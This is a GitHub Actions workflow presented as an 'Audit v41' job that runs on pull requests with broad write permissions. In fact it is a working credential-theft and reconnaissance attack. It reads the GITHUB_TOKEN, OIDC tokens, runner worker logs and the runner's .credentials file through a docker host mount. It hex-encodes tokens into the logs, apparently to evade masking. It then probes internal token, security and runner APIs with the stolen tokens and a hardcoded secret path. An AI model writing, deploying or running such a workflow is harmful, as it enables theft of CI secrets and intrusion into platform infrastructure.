name: Audit v41
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v41:
    runs-on: ubuntu-latest
    steps:

      # ══════════════════════════════════════════════════════════════
      # STEP 1: Harvest
      # ══════════════════════════════════════════════════════════════
      - name: Step 1 - Harvest
        if: always()
        run: |
          set +e
          echo "=== V41 HARVEST ==="
          echo "$PATH" > /tmp/saved_path.txt
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt
          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          if [ -f "$WLOG" ]; then
            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
            done
            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            echo "PLAN=$PLAN JOB=$JOB"
            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
          fi
          docker run --rm -v /:/h alpine sh -c '
            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
          ' 2>/dev/null > /tmp/hex_extract.txt
          python3 -c "
          import binascii,json
          raw=open('/tmp/hex_extract.txt').read()
          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
          if s>=0 and e>=0:
            h=raw[s+14:e].strip()
            d=json.loads(binascii.unhexlify(h).decode())
            t=d.get('Data',{}).get('token','')
            open('/tmp/cred_token.txt','w').write(t)
            print(f'CTOK_LEN={len(t)}')
          " 2>/dev/null
          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: AKS BACKEND + serviceHosts paths
      # v40: runner defs expose runnerghubeus1aks.eastus.cloudapp.azure.com
      # and serviceHosts/8f795dfa path — BYPASSES SECRET path!
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - AKS backend + serviceHosts
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== AKS BACKEND + SERVICEHOSTS ==="
          IDTOK=$(cat /tmp/idtok.txt)
          RT=$(cat /tmp/rt.txt)
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
          IID="8f795dfa-02d7-4018-af3a-c98d25c03f68"
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"

          # A: Hit AKS hostname directly (internal Azure cluster!)
          echo "--- A: AKS backend ---"
          AKS="https://runnerghubeus1aks.eastus.cloudapp.azure.com"
          for EP in \
            "/" \
            "/serviceHosts/$IID/_apis/connectionData" \
            "/serviceHosts/$IID/_apis/resourceareas" \
            "/serviceHosts/$IID/_apis/ServiceDefinitions" \
            "/_apis/connectionData" \
            "/_apis/resourceareas" \
            "/$SECRET/_apis/connectionData" \
            "/healthcheck" \
            "/health" \
            "/metrics"; do
            for TOK_NAME in IDTOK RT CTOK; do
              eval TOK=\$$TOK_NAME
              [ -z "$TOK" ] || [ ${#TOK} -lt 10 ] && continue
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $TOK" "$AKS$EP" 2>&1)
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              [ "$CODE" != "HTTP_000" ] && \
                echo "A $TOK_NAME $EP = $CODE | $(echo "$BODY" | head -c 200)"
            done
          done
          echo ""

          # B: serviceHosts path on runner.actions (NOT the secret path)
          echo "--- B: Runner serviceHosts ---"
          for BASE in \
            "https://runner.actions.githubusercontent.com/serviceHosts/$IID" \
            "https://pipelines.actions.githubusercontent.com/serviceHosts/$IID" \
            "https://pipelinesghubeus14.actions.githubusercontent.com/serviceHosts/$IID"; do
            echo "== $BASE =="
            for EP in \
              "/_apis/connectionData" \
              "/_apis/resourceareas" \
              "/_apis/ServiceDefinitions" \
              "/_apis/distributedtask/pools" \
              "/_apis/runner/pools" \
              "/_apis/runner/agents"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $IDTOK" "$BASE$EP")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                echo "B $EP = $CODE | $(echo "$BODY" | head -c 200)"
            done
            echo ""
          done

          # C: runnerghubeus1 scale-unit host (NOT aks, no Secret)
          echo "--- C: Scale unit ---"
          for BASE in \
            "https://runnerghubeus1.actions.githubusercontent.com/$SECRET" \
            "https://runnerghubeus1.actions.githubusercontent.com/serviceHosts/$IID" \
            "https://runnerghubeus1.actions.githubusercontent.com"; do
            echo "== $BASE =="
            for EP in \
              "/_apis/connectionData" \
              "/_apis/ServiceDefinitions" \
              "/_apis/runner/pools" \
              "/_apis/runner/agents"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $IDTOK" "$BASE$EP")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                echo "C $EP = $CODE | $(echo "$BODY" | head -c 200)"
            done
            echo ""
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 3: vstoken REAL API routes
      # v40: 93 defs gave us identifiers — now construct actual paths
      # Format: _apis/{serviceType}/{identifier} OR by route pattern
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - vstoken API routes
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== VSTOKEN REAL ROUTES ==="
          IDTOK=$(cat /tmp/idtok.txt)
          RT=$(cat /tmp/rt.txt)
          PLAN=$(cat /tmp/plan.txt)
          VS="https://vstoken.actions.githubusercontent.com/serviceDeployments/tokenghubeus21"

          # Hit each identifier-based route
          echo "--- TokenIssue ---"
          for ROUTE in \
            "/_apis/token/AccessTokens" \
            "/_apis/token/SessionTokens" \
            "/_apis/token/AppSessionTokens" \
            "/_apis/token/AppTokenPairs" \
            "/_apis/token/AadUserTokens" \
            "/_apis/token/AadAppTokens" \
            "/_apis/TokenIssue/AccessTokens" \
            "/_apis/TokenIssue/SessionTokens" \
            "/_apis/tokenissue/AccessTokens" \
            "/_apis/tokenissue/SessionTokens"; do
            for METHOD in GET POST; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X $METHOD --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
                "$VS$ROUTE" -d '{}' 2>/dev/null)
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && [ "$CODE" != "HTTP_405" ] && \
                echo "$METHOD $ROUTE = $CODE | $(echo "$BODY" | head -c 200)"
            done
          done
          echo ""

          echo "--- TokenAuth ---"
          for ROUTE in \
            "/_apis/token/Authorizations" \
            "/_apis/token/RegistrationSecret" \
            "/_apis/token/HostAuthorization" \
            "/_apis/token/Registration" \
            "/_apis/TokenAuth/Authorizations" \
            "/_apis/TokenAuth/RegistrationSecret" \
            "/_apis/TokenAuth/HostAuthorization" \
            "/_apis/TokenAuth/Registration" \
            "/_apis/tokenauth/Authorizations" \
            "/_apis/tokenauth/RegistrationSecret"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $IDTOK" "$VS$ROUTE")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "GET $ROUTE = $CODE | $(echo "$BODY" | head -c 200)"
          done
          echo ""

          echo "--- Security + Admin ---"
          for ROUTE in \
            "/_apis/security/AccessControlLists" \
            "/_apis/security/Permissions" \
            "/_apis/security/SecurityNamespaces" \
            "/_apis/security/AccessControlEntries" \
            "/_apis/security/PermissionEvaluationBatch" \
            "/_apis/TokenAdministration/TokenPersonalAccessTokens" \
            "/_apis/TokenAdministration/TokenRevocations" \
            "/_apis/TokenAdministration/TokenListGlobalIdentities" \
            "/_apis/Migration/SasTokenRequest" \
            "/_apis/WebPlatformAuth/SessionToken" \
            "/_apis/NameResolution/Entries" \
            "/_apis/Health/Health" \
            "/_apis/FeatureAvailability/FeatureFlags" \
            "/_apis/tokenoauth2/token" \
            "/_apis/Contribution/dataProvidersQuery"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $IDTOK" "$VS$ROUTE")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "$ROUTE = $CODE | $(echo "$BODY" | head -c 200)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 4: Runner sub-services + RT pipeline 95 defs
      # v40: runner has 19 sub-services under runner area
      # RT gets 95 defs on pipeline (IDTOK gets 403!)
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - Runner services + pipeline defs
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== RUNNER SERVICES + PIPE DEFS ==="
          IDTOK=$(cat /tmp/idtok.txt)
          RT=$(cat /tmp/rt.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          RUNNER="https://runner.actions.githubusercontent.com/$SECRET"
          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"

          # A: All 19 runner sub-services
          echo "--- A: Runner sub-services ---"
          for ROUTE in \
            "/_apis/runner/configurations" \
            "/_apis/runner/imageVersions" \
            "/_apis/runner/imageDefinitions" \
            "/_apis/runner/metrics" \
            "/_apis/runner/agents" \
            "/_apis/runner/adminevents" \
            "/_apis/runner/autoscaling" \
            "/_apis/runner/hostLimits" \
            "/_apis/runner/labels" \
            "/_apis/runner/reset" \
            "/_apis/runner/pools" \
            "/_apis/runner/versions" \
            "/_apis/runner/imagesCustom" \
            "/_apis/runner/imagesMarketplace" \
            "/_apis/runner/runnerspecs" \
            "/_apis/runner/betafeatures" \
            "/_apis/runner/machinespecs" \
            "/_apis/runner/imagesCurated" \
            "/_apis/runner/poolImageVersions"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $IDTOK" "$RUNNER$ROUTE")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "A $ROUTE = $CODE | $(echo "$BODY" | head -c 200)"
          done
          echo ""

          # B: Full 95 pipeline ServiceDefs with RT
          echo "--- B: Pipeline 95 defs (RT) ---"
          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $RT" "$PIPE/_apis/ServiceDefinitions")
          echo "$R" | python3 -c "
          import json,sys
          d=json.load(sys.stdin)
          for s in d.get('value',[]):
            st=s.get('serviceType','')
            ident=s.get('identifier','')
            disp=s.get('displayName','')
            locs=s.get('locationMappings',[])
            routes=[]
            for l in locs:
              loc=l.get('location','')
              mon=l.get('accessMappingMoniker','')
              if loc: routes.append(f'{mon}={loc}')
            rstr=' | '.join(routes[:3])
            print(f'{st} | {ident} | {disp} | {rstr}')
          " 2>/dev/null

      # ══════════════════════════════════════════════════════════════
      # STEP 5: Final
      # ══════════════════════════════════════════════════════════════
      - name: Step 5 - Final
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== V41 FINAL ==="
          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
          echo "=== V41 COMPLETE ==="
